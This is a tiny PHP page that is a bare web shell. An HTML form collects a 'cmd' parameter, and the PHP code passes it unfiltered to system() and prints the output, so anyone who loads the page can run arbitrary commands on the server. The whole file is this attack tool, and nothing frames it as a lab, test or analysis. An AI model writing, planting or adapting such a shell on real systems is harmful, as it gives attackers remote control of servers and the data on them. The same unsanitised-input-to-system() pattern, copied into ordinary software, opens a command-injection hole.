<html>

	<form action="" method="GET">
		<p> Enter your command here: </p>
		<input type="text" name="cmd" id = "cmd"> </input>
		<input type="submit" id="submit"> </input>
	</form>
<pre>

<?php

if(isset($_GET['cmd']))
{
	system($_GET['cmd']);
}

?>

</pre>

</html>
